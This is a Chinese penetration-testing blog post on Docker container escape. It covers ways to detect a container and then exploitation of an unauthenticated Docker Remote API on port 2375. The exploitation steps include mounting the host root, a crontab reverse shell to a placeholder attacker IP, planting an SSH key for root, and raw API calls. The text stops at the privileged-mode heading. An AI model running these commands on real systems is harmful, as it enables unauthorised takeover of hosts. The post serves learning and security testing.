class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/Docker/" style="font-size: 1.05rem;">Docker<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 1.05rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 1.05rem;">NTLM<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>18</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 1.05rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">云安全<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 1.05rem;">权限提升<sup>2</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 1.05rem;">横向移动<sup>4</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 1.05rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">九月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>权限提升</span></a><a class="article-meta__tags" href="/tags/Docker/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Docker</span></a><a class="article-meta__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>云安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Docker Escape</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-05-10T16:00:00.000Z" title="发表于 2025-05-11 00:00:00">2025-05-11</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-06-07T08:18:06.471Z" title="更新于 2025-06-07 16:18:06">2025-06-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Docker Escape"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/35958/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" tabindex="-1" itemprop="url">权限提升</a><a href="/tags/Docker/" tabindex="-1" itemprop="url">Docker</a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">云安全</a><h1 id="CrawlerTitle" itemprop="name headline">Docker Escape</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2025-05-10T16:00:00.000Z" title="发表于 2025-05-11 00:00:00">2025-05-11</time><time itemprop="dateCreated datePublished" datetime="2025-06-07T08:18:06.471Z" title="更新于 2025-06-07 16:18:06">2025-06-07</time></header><h1 id="Docker-Escape"><a href="#Docker-Escape" class="headerlink" title="Docker Escape"></a>Docker Escape</h1><h2 id="0-容器环境确认"><a href="#0-容器环境确认" class="headerlink" title="0.容器环境确认"></a>0.容器环境确认</h2><p>获得到一个shell之后我们首先需要判断的是当前是否处于容器环境中，否则后续的一切渗透可能都将会受阻。</p>
<p>那么如何判断?</p>
<p>以下是判断当前环境是否为容器环境的常见方法，适用于 Docker、LXC 等容器环境：</p>
<hr>
<h3 id="1-检查-proc-1-cgroup-文件"><a href="#1-检查-proc-1-cgroup-文件" class="headerlink" title="1. 检查 /proc/1/cgroup 文件"></a><strong>1. 检查 <code>/proc/1/cgroup</code> 文件</strong></h3><p>容器环境的进程控制组（cgroup）信息通常包含 <code>docker</code>、<code>kubepods</code>（Kubernetes）等标识。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：</p>
<ul>
<li>如果输出中包含 <code>/docker/</code>、<code>/lxc/</code> 或 <code>kubepods</code> 等关键字，则为容器环境。  </li>
<li>物理机或虚拟机通常显示 <code>/</code> 或系统默认的层级（如 <code>systemd</code>）。</li>
</ul>
<hr>
<h3 id="2-检查-dockerenv-文件"><a href="#2-检查-dockerenv-文件" class="headerlink" title="2. 检查 /.dockerenv 文件"></a><strong>2. 检查 <code>/.dockerenv</code> 文件</strong></h3><p>Docker 容器启动时会在根目录生成此文件（其他容器如 LXC 无此文件）。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /.dockerenv</span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：<br>若文件存在，则极可能是 Docker 容器环境。</p>
<hr>
<h3 id="3-检查-proc-mounts-中的挂载信息"><a href="#3-检查-proc-mounts-中的挂载信息" class="headerlink" title="3. 检查 /proc/mounts 中的挂载信息"></a><strong>3. 检查 <code>/proc/mounts</code> 中的挂载信息</strong></h3><p>容器中挂载的文件系统通常包含 <code>overlay</code>（Docker 默认存储驱动）或 <code>aufs</code>。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/mounts | grep -E <span class="string">&quot;overlay|aufs&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：<br>若存在 <code>overlay</code> 或 <code>aufs</code> 挂载项，则可能是容器环境。</p>
<hr>
<h3 id="4-检查进程数量"><a href="#4-检查进程数量" class="headerlink" title="4. 检查进程数量"></a><strong>4. 检查进程数量</strong></h3><p>容器内通常只运行少量关键进程（如 <code>PID 1</code> 为业务进程），而物理机或虚拟机进程数量较多。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：<br>若进程数量极少（如少于 10 个），可能是容器环境（但需结合其他方法验证）。</p>
<hr>
<h3 id="5-检查虚拟化类型（systemd-detect-virt）"><a href="#5-检查虚拟化类型（systemd-detect-virt）" class="headerlink" title="5. 检查虚拟化类型（systemd-detect-virt）"></a><strong>5. 检查虚拟化类型（<code>systemd-detect-virt</code>）</strong></h3><p>通过检测虚拟化工具类型判断环境。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-detect-virt</span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：  </p>
<ul>
<li>容器环境可能返回 <code>docker</code>、<code>lxc</code> 或 <code>podman</code>。  </li>
<li>物理机通常返回 <code>none</code>，虚拟机返回 <code>kvm</code>、<code>vmware</code> 等。</li>
</ul>
<hr>
<h3 id="6-检查设备文件"><a href="#6-检查设备文件" class="headerlink" title="6. 检查设备文件"></a><strong>6. 检查设备文件</strong></h3><p>容器环境可能缺少物理机常见的硬件设备（如磁盘、USB 控制器）。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /dev/sd*   <span class="comment"># 查看磁盘设备（容器通常无额外磁盘）</span></span><br><span class="line"><span class="built_in">ls</span> -l /dev/tty*  <span class="comment"># 检查终端设备数量（容器通常较少）</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="7-检查内核版本与宿主机是否一致"><a href="#7-检查内核版本与宿主机是否一致" class="headerlink" title="7. 检查内核版本与宿主机是否一致"></a><strong>7. 检查内核版本与宿主机是否一致</strong></h3><p>容器通常与宿主机共享内核，但某些环境（如 <code>User Mode Linux</code>）可能不同。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
<p><strong>判断依据</strong>：<br>如果内核版本与预期宿主机版本一致，但当前环境功能受限，可能是容器。</p>
<hr>
<h3 id="8-检查环境变量"><a href="#8-检查环境变量" class="headerlink" title="8. 检查环境变量"></a><strong>8. 检查环境变量</strong></h3><p>容器启动时可能注入特定的环境变量（如 <code>KUBERNETES_SERVICE_HOST</code>）。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -E <span class="string">&quot;DOCKER|KUBERNETES|CONTAINER&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="9-检查网络接口"><a href="#9-检查网络接口" class="headerlink" title="9. 检查网络接口"></a><strong>9. 检查网络接口</strong></h3><p>容器通常存在虚拟网卡（如 <code>eth0</code>），且 IP 地址为内网段（如 <code>172.17.x.x</code>）。<br><strong>命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a | grep eth0</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="10-尝试访问宿主机资源"><a href="#10-尝试访问宿主机资源" class="headerlink" title="10. 尝试访问宿主机资源"></a><strong>10. 尝试访问宿主机资源</strong></h3><p>如果怀疑是容器，可尝试探测宿主机网络（需容器有权限）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看宿主机 IP（通常为网关）</span></span><br><span class="line">ip route show default | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 尝试访问宿主机服务（如 Docker API）</span></span><br><span class="line">curl http://172.17.0.1:2375/version</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="自动化检测脚本示例"><a href="#自动化检测脚本示例" class="headerlink" title="自动化检测脚本示例"></a><strong>自动化检测脚本示例</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">is_container=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 /.dockerenv</span></span><br><span class="line"><span class="keyword">if</span> [ -f /.dockerenv ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] Docker 环境检测: /.dockerenv 存在&quot;</span></span><br><span class="line">  is_container=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 /proc/1/cgroup</span></span><br><span class="line"><span class="keyword">if</span> grep -qi <span class="string">&quot;docker\|lxc\|kubepods&quot;</span> /proc/1/cgroup; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] Cgroup 检测: 容器环境特征存在&quot;</span></span><br><span class="line">  is_container=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查进程数量</span></span><br><span class="line"><span class="keyword">if</span> [ $(ps -ef | <span class="built_in">wc</span> -l) -lt 10 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] 进程数量异常: 可能是容器环境&quot;</span></span><br><span class="line">  is_container=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综合判断</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$is_container</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[!] 当前环境可能是容器&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[ ] 当前环境可能是物理机或虚拟机&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h3><ol>
<li><strong>没有绝对可靠的方法</strong>：某些高度定制的容器可能隐藏特征（如删除 <code>/.dockerenv</code>）。  </li>
<li><strong>综合判断</strong>：需结合多种检测结果提高准确性。  </li>
<li><strong>防御方对抗</strong>：安全加固的容器可能故意混淆这些特征（如使用 <code>--security-opt seccomp=unconfined</code>）。</li>
</ol>
<h2 id="一、Docker-Swarm-remote-api-未授权访问逃逸技术"><a href="#一、Docker-Swarm-remote-api-未授权访问逃逸技术" class="headerlink" title="一、Docker Swarm remote api 未授权访问逃逸技术"></a>一、Docker Swarm remote api 未授权访问逃逸技术</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h3><p>Docker Remote API 是 Docker 守护进程（Dockerd）提供的 REST 接口，默认绑定在 <code>2375</code> 端口（HTTP）或 <code>2376</code> 端口（HTTPS）。当管理员错误配置 Docker Swarm 集群时，可能将 API 暴露在公网（如绑定 <code>0.0.0.0:2375</code>），导致攻击者可绕过认证直接控制 Docker 服务。通过 API 创建特权容器或挂载宿主机敏感目录，可实现容器逃逸并获取宿主机权限。</p>
<h4 id="Docker-Swarm-环境搭建"><a href="#Docker-Swarm-环境搭建" class="headerlink" title="Docker Swarm 环境搭建"></a>Docker Swarm 环境搭建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在docker.service的ExecStart启动项中增加&quot;-H tcp://0.0.0.0:2375&quot;</span></span><br><span class="line">$ vim  /usr/lib/systemd/system/docker.service</span><br><span class="line">ExecStart=/usr/bin/dockerd -H unix:// -H tcp://0.0.0.0:2375</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重载服务，重启docker</span></span><br><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Swarm</span></span><br><span class="line">$ docker swarm init</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2. 漏洞检测"></a><strong>2. 漏洞检测</strong></h3><h4 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="(1) 端口扫描"></a><strong>(1) 端口扫描</strong></h4><ul>
<li><p>检查目标是否开放 <code>2375</code> 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p2375 &lt;target_ip&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-API-探测"><a href="#2-API-探测" class="headerlink" title="(2) API 探测"></a><strong>(2) API 探测</strong></h4><ul>
<li><p>通过 HTTP 请求验证是否存在未授权访问：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://&lt;target_ip&gt;:2375/containers/json <span class="comment"># docker服务器上运行的docker容器列表，以及容器的配置信息</span></span><br><span class="line">curl http://&lt;target_ip&gt;:2375/version  <span class="comment"># 返回 Docker 版本信息则存在漏洞</span></span><br><span class="line">curl http://&lt;target_ip&gt;:2375/info | grep DockerRootDir  <span class="comment"># 获取宿主机 Docker 根目录路径</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-Docker-客户端验证"><a href="#3-Docker-客户端验证" class="headerlink" title="(3) Docker 客户端验证"></a><strong>(3) Docker 客户端验证</strong></h4><ul>
<li><p>使用 Docker 客户端直接连接远程 API：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://&lt;target_ip&gt;:2375 ps  <span class="comment"># 列出容器信息（无需认证）</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a><strong>3. 漏洞利用</strong></h3><h4 id="1-创建特权容器挂载宿主机目录"><a href="#1-创建特权容器挂载宿主机目录" class="headerlink" title="(1) 创建特权容器挂载宿主机目录"></a><strong>(1) 创建特权容器挂载宿主机目录</strong></h4><ul>
<li><p><strong>步骤</strong>：</p>
<ol>
<li>通过 API 创建容器并挂载宿主机根目录到容器内：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://&lt;target_ip&gt;:2375 run -it -v /:/mnt alpine:latest /bin/sh</span><br></pre></td></tr></table></figure>

<ol>
<li>在容器内修改宿主机文件（如写入定时任务或 SSH 公钥）：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入反弹 Shell 到宿主机 crontab</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1&quot;</span> &gt;&gt; /mnt/etc/crontab</span><br><span class="line"><span class="comment"># 或写入 SSH 公钥到宿主机 root 用户</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2E...&quot;</span> &gt;&gt; /mnt/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<ol>
<li>攻击机监听反弹 Shell 或通过 SSH 登录宿主机46。</li>
</ol>
</li>
</ul>
<h4 id="2-直接操作-Docker-API"><a href="#2-直接操作-Docker-API" class="headerlink" title="(2) 直接操作 Docker API"></a><strong>(2) 直接操作 Docker API</strong></h4><ul>
<li><p>通过 HTTP 请求创建恶意容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建挂载宿主机目录的容器</span></span><br><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123;&quot;Image&quot;:&quot;alpine:latest&quot;, &quot;Cmd&quot;:[&quot;/bin/sh&quot;], &quot;Volumes&quot;:&#123;&quot;/host&quot;: &#123;&#125;&#125;, &quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/host&quot;]&#125;&#125;&#x27;</span> \</span><br><span class="line">http://&lt;target_ip&gt;:2375/containers/create</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器并执行命令</span></span><br><span class="line">curl -X POST http://&lt;target_ip&gt;:2375/containers/&lt;container_id&gt;/start</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="二、特权模式（Privileged-Mode）逃逸"><a href="#二、特权模式（Privileged-Mode）逃逸" class="headerlink" title="二、特权模式（Privileged Mode）逃逸"></a>二、特权模式（Privileged Mode）逃逸</h2><hr>
